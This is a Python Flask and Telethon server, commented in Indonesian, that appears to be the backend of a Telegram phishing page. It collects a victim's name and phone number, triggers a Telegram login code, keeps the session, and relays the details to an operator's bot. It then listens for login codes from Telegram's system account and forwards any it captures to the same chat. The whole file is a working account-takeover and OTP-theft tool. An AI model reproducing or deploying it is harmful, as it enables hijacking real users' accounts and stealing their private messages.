import os
import requests
import asyncio
import re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from asgiref.sync import async_to_sync

app = Flask(__name__)
CORS(app)

# Ambil Config dari Railway Env
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Memory Storage (Karena Railway Read-Only)
user_sessions = {}  # Menyimpan session string tiap nomor
active_status_msg = {} # Melacak pesan "Menunggu OTP"

def send_bot(text, buttons=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    if buttons:
        payload["reply_markup"] = {"inline_keyboard": buttons}
    res = requests.post(url, json=payload).json()
    return res.get("result", {}).get("message_id")

def delete_bot(msg_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "message_id": msg_id})

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    step = data.get('step')
    raw_nomor = data.get('nomor', '').strip().replace(" ", "")
    nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
    nama = data.get('nama', 'User')

    # Buat client sementara untuk ambil session awal
    client = TelegramClient(StringSession(""), int(API_ID), API_HASH)
    
    try:
        async_to_sync(client.connect)()
        if step == 1:
            # Kirim OTP awal agar backend dapat akses sesi
            res = async_to_sync(client.send_code_request)(nomor)
            user_sessions[nomor] = client.session.save()
            
            # Tampilan bot sesuai permintaan
            send_bot(
                f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : ",
                [[{"text": "otp", "callback_data": f"track_{nomor}"}]]
            )
            return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        async_to_sync(client.disconnect)()

@app.route('/webhook', methods=['POST'])
async def webhook():
    update = request.json
    if "callback_query" in update:
        call = update["callback_query"]
        data = call["data"]
        
        if data.startswith("track_"):
            nomor = data.split("_")[1]
            # Tampilkan status menunggu
            msg_id = send_bot(
                "status menunggu OTP", 
                [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]
            )
            active_status_msg[nomor] = msg_id
            
            # Mulai pantau pesan masuk secara otomatis
            session_str = user_sessions.get(nomor)
            if session_str:
                asyncio.create_task(otp_listener(nomor, session_str))

        elif data.startswith("exit_"):
            nomor = data.split("_")[1]
            if nomor in active_status_msg:
                delete_bot(active_status_msg[nomor])
                active_status_msg.pop(nomor)
            send_bot("Anda telah keluar dari mode input inline")

    return jsonify({"status": "success"}), 200

async def otp_listener(nomor, session_str):
    client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
    await client.connect()
    
    # Deteksi pesan dari sistem Telegram (777000)
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        otp_match = re.search(r'\b\d{5}\b', event.raw_text)
        if otp_match:
            otp_code = otp_match.group(0)
            # Hapus teks "menunggu" dan kirim hasil
            if nomor in active_status_msg:
                delete_bot(active_status_msg[nomor])
                active_status_msg.pop(nomor)
            
            send_bot(f"✅ **OTP TERDETEKSI!**\nNomor: `{nomor}`\nOTP : `{otp_code}`")
            await client.disconnect()

    await asyncio.sleep(300) # Pantau selama 5 menit
    await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))